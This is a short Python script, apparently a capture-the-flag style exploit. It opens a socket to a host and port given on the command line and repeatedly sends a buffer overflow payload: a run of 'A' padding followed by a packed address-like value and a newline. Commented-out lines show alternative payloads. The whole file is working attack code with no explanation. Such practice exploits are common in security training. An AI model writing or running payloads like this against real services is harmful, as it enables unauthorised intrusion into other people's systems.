import socket
import sys
from pwn import *

hostname = sys.argv[1]
port = int(sys.argv[2])

print('work')
pack = 'AAAAAAAAAAAAAAAAAAA'
#print(pack)
def netcat(hn,port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((hn,port))
	try:
		data = s.recv(1024)
		while data:
			print("recv")
			print(repr(data))
			data = ''
			s.send(b'\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x67\xCA\xF0\xFF\x0A')
			#s.send(p32(0xcb64).encode())
			#s.send('\n'.encode())
			data = s.recv(1024)
	except:
		print("no data")
	finally:
		s.close()
	



netcat(hostname,port)